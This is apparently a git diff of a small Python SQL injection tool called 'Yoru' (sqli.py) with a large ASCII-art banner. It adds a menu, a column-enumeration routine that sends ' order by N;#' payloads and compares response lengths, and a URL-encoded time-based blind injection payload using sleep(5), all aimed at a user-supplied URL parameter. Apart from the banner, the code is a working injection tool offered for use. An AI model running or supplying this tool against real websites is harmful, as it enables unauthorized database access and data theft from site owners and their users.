@@ -4,7 +4,11 @@ from art import *
 
 
 def help():
-	tprint("       Yoru","slant")
+	tprint("\n    Yoru","slant")
+	print("\n[-] Example Sintax: python3 sqli.py -u http://192.168.1.102/contact.php?id= \n")
+	print("[-] -h to help")
+
+def banner():
 	banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡾⠀⠀⠀⠀⠀⢀⡔⣰⡇⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -38,10 +42,77 @@ def help():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠀⢀⡄⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⣴⣿⣿⡟⣾⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 	"""
 	print(banner)
-	print("\n[-] Example: python3 sqli.py -u 'http://192.168.1.102/contact.php?id=' \n")
+
 
 def main():
-	import requests, sys, random, string, os
+	help()
+
+	print("-" * 60)
+	print("[1] Time based")
+	print("[2] Enum tables ")
+	print("-" * 60)
+
+	choice = int(input("Choose an option: \n"))
+
+	if choice > 2 or choice < 1:
+	    print("Please choose a valid number")
+	    help()
+
+	elif  choice == 1:
+		timebased()
+	elif choice == 2:
+		enum_tables()
+
+def enum_tables():
+        import requests, sys, random, string, os, urllib.parse
+
+        if len(sys.argv) != 3 and sys.argv[1] != "-h" :
+                help()
+
+
+        elif sys.argv[1] != "-u":
+                help()
+
+
+        elif len(sys.argv) == 3 and sys.argv[1] == "-u":
+            try:
+                os.system("clear")
+                print(f"\033[92m[*] Trying Enumerating {sys.argv[2]}\n")
+
+		# Payload and Encode
+                list = (1)
+                payload = f"' order by {list};#"
+                url_encode = urllib.parse.quote_plus(payload)
+                print(f"[+] Payload with URL Encode: {url_encode}")
+
+		# First Request
+                result = requests.get(sys.argv[2] + url_encode)
+                print(f"[+] Request without URL Encode: {sys.argv[2] + payload}")
+                request_length = len(result.content)
+                print(f"[+] Request Length: {request_length}")
+
+                # Second Request
+
+                while request_length == len(result.content):
+
+                    list += 1
+
+                    payload = f"' order by {list};#"
+                    url_encode = urllib.parse.quote_plus(payload)
+
+                    result = requests.get(sys.argv[2] + url_encode)
+
+                    print(f"[+] Request without URL Encode: {sys.argv[2] + payload}")
+
+                    print(f"[+] Request Length: {len(result.content)}")
+                print(f"[+] Current DB has: {list-1} columns")
+
+            except Exception as error:
+                print(f"\033[94m[-] Verify if url value is correct\n\n \033[91m{error}\n")
+
+
+def timebased():
+	import requests, sys, random, string, os, urllib.parse
 
 	if len(sys.argv) != 3 and sys.argv[1] != "-h" :
 		help()
@@ -62,7 +133,10 @@ def main():
 
 			# Time based Payload
 			payload = f"' and (select * from (select(sleep(5))){random}) and '1'='1#"
-			print(f"\033[92m[*] Payload used: {payload}\n")
+
+
+			url_encode = urllib.parse.quote_plus(payload)
+			print(f"\033[92m[*] Payload used: {url_encode}\n")
 
 			# Doing request
 			result = requests.get(sys.argv[2] + payload)
@@ -77,12 +151,12 @@ def main():
 
 
 try:
-	main()
+        banner()
+        main()
 except Exception as error:
 	help()
 	print("[-] Probably you didn't pass all arguments")
 
-
-
-
-
+except KeyboardInterrupt:
+       print("\n[-] Stopped by User")
+       exit(0)
